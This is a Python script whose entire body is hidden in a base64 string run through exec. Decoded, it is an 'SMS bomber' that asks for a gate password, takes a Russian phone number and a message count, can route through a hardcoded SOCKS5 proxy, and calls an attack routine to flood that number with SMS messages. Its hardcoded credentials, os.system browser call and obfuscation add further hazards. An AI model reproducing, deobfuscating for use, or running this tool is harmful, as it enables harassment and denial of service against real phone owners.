import marshal, base64
exec(base64.b64decode("aW1wb3J0IG9zCkNvcnJlY3RVc2VybmFtZSA9ICJnMHNhaW4iCkNvcnJlY3RQYXNzd29yZCA9ICJDbDBuaW5nIgoKbG9vcCA9ICd0cnVlJwp3aGlsZSAobG9vcCA9PSAndHJ1ZScpOgogICAgdXNlcm5hbWUgPSByYXdfaW5wdXQoIlwwMzNbMTs5Nm1bI10gXHgxYlswOzM2bSBFbnRlciBVc2VybmFtZVx4MWJbMTs5Mm3inqQgIikKICAgIGlmICh1c2VybmFtZSA9PSBDb3JyZWN0VXNlcm5hbWUpOgogICAgCXBhc3N3b3JkID0gcmF3X2lucHV0KCJcMDMzWzE7OTZtWyNdIFx4MWJbMDszNm0gRW50ZXIgUGFzc3dvcmRceDFiWzE7OTJt4p6kICIpCiAgICAgICAgaWYgKHBhc3N3b3JkID09IENvcnJlY3RQYXNzd29yZCk6CiAgICAgICAgICAgIHByaW50ICJMb2dnZWQgaW4gc3VjY2Vzc2Z1bGx5IGFzICIgKyB1c2VybmFtZSAjZmItY2xvbmluZy1pZCBTRwogICAgICAgICAgICBsb29wID0gJ2ZhbHNlJwogICAgICAgIGVsc2U6CiAgICAgICAgICAgIHByaW50ICJXcm9uZyBwYXNzd29yZCEiCiAgICAgICAgICAgIG9zLnN5c3RlbSgneGRnLW9wZW4gaHR0cHM6Ly93d3cuaW5zdGFncmFtLmNvbS9zaHViaGFtX2cwc2Fpbi8/aGw9ZW4nKQogICAgZWxzZToKICAgICAgICBwcmludCAiV3JvbmcgdXNlcm5hbWUhIgogICAgICAgIG9zLnN5c3RlbSgneGRnLW9wZW4gaHR0cHM6Ly93d3cuaW5zdGFncmFtLmNvbS9zaHViaGFtX2cwc2Fpbi8/aGw9ZW4nKQoKaW1wb3J0IHJlcXVlc3RzCmltcG9ydCBzZXJ2aWNlcwoKIyBjb2xvdXJzCmdyZWVuICAgICA9ICdcMDMzWzkybScKY3lhbiAgICAgID0gJ1wwMzNbOTVtJwpib2xkICAgICAgPSAnXDAzM1sxbScKdW5kZXJsaW5lID0gJ1wwMzNbNG0nCmVuZCAgICAgICA9ICdcMDMzWzBtJwpyZWQgICAgICAgPSAnXDAzM1s5MW0nCgojIGhlYWRlcgpwcmludChmIntncmVlbn17Ym9sZH1cdFx0e3VuZGVybGluZX1bTkkgQk9NQkVSIDIuNF17ZW5kfSIpCgpwcmludCgpCnByaW50KGYie2JvbGR9Y29kZWQgYnl7ZW5kfSIsIGVuZD0iIikKcHJpbnQoZiJ7Z3JlZW59e2JvbGR9ID4+IHtlbmR9IiwgZW5kPSIiKQpwcmludChmIntjeWFufXtib2xkfVNodUJoYW1nMHNhaW57ZW5kfSIpCgpwcmludChmIntib2xkfXRlbGVncmFte2VuZH0iLCBlbmQ9IiIpCnByaW50KGYie2dyZWVufXtib2xkfSA+PiB7ZW5kfSIsIGVuZD0iIikKcHJpbnQoZiJ7Y3lhbn17Ym9sZH1AU2h1QmhhbV9nMHNhaW57ZW5kfSIpCnByaW50KCkKCiMgaW5wdXRzCnByaW50KCdlbnRlciB0aGUgbnVtYmVyIHdpdGhvdXQgb3Igd2l0aCBwcmVmaXhlcyAoKzcpICg4KVxuZXhhbXBsZTogOTAxODAxNzAxMCcpCmlucHV0X251bWJlciA9IGlucHV0KGdyZWVuICsgYm9sZCArICI+PiAiICsgZW5kKQpwcmludCgnaG93IG1hbnkgc21zIHRvIHNlbmQ/JykKc21zID0gaW50KGlucHV0KGdyZWVuICsgYm9sZCArICI+PiAiICsgZW5kKSkKCnByaW50KGYieW91IG5lZWQgYXtjeWFufSB0b3Ige2VuZH15L24/ICIpCmlzX3RvciA9IGlucHV0KGJvbGQgKyBncmVlbiArICI+PiAiICsgZW5kKQoKCmRlZiBwYXJzZV9udW1iZXIobnVtYmVyKToKCW1zZyA9IGYiWypdY2hlY2sgbnVtYmVyIC0ge2dyZWVufXtib2xkfU9Le2VuZH0iCglpZiBsZW4obnVtYmVyKSBpbiAoMTAsIDExLCAxMik6CgkJaWYgbnVtYmVyWzBdID09ICI4IjoKCQkJbnVtYmVyID0gbnVtYmVyWzE6XQoJCQlwcmludChtc2cpCgkJZWxpZiBudW1iZXJbOjJdID09ICIrNyI6CgkJCW51bWJlciA9IG51bWJlclsyOl0KCQkJcHJpbnQobXNnKQoJCWVsaWYgaW50KGxlbihudW1iZXIpKSA9PSAxMCBhbmQgbnVtYmVyWzBdID09IDk6CgkJCXByaW50KG1zZykKCWVsc2U6CgkJcHJpbnQoZiJbKl1jaGVjayBudW1iZXIgLSB7cmVkfXtib2xkfWZhaWxlZCBudW1iZXIhe2VuZH1cblRoaXMgYm9tYmVyIGlzIGludGVuZGVkIG9ubHkgZm9yIFJ1c3NpYSBhbmQgaWYgdGhlIG51bWJlciB5b3UgZW50ZXJlZCBiZWxvbmdzIHRvIGFub3RoZXIgY291bnRyeSB0aGVuIGFsYXMgdGhpcyBib21iZXIgaXMgbm90IHN1aXRhYmxlIGZvciB5b3UhIikKCQlxdWl0KCkKCXJldHVybiBudW1iZXIKbnVtYmVyID0gcGFyc2VfbnVtYmVyKGlucHV0X251bWJlcikKCiMgdG9yCmlmIHN0cihpc190b3IpID09ICJ5IjoKICAgICAgICBwcmludChmIlsqXWxhdW5jaCB7Y3lhbn17Ym9sZH1Ub3J7ZW5kfS4uLiIpCiAgICAgICAgcHJveGllcyA9IHsKICAgICAgICAgICAgJ2h0dHAnOiAnc29ja3M1Oi8vMTM5LjU5LjUzLjEwNToxMDgwJywKICAgICAgICAgICAgJ2h0dHBzJzogJ3NvY2tzNTovLzEzOS41OS41My4xMDU6MTA4MCcKICAgICAgICB9CiAgICAgICAgdG9yID0gcmVxdWVzdHMuZ2V0KCdodHRwOi8vaWNhbmhhemlwLmNvbS8nLCBwcm94aWVzPXByb3hpZXMpLnRleHQKICAgICAgICB0b3IgPSAodG9yLnJlcGxhY2UoJ1xuJywgJycpKQogICAgICAgIHByaW50KGYiWypdbGF1bmNoIHtjeWFufXtib2xkfVRvcntlbmR9IC0ge2dyZWVufXtib2xkfU9Le2VuZH0iKQoKc2VydmljZXMuYXR0YWNrKG51bWJlciwgc21zKQo="))
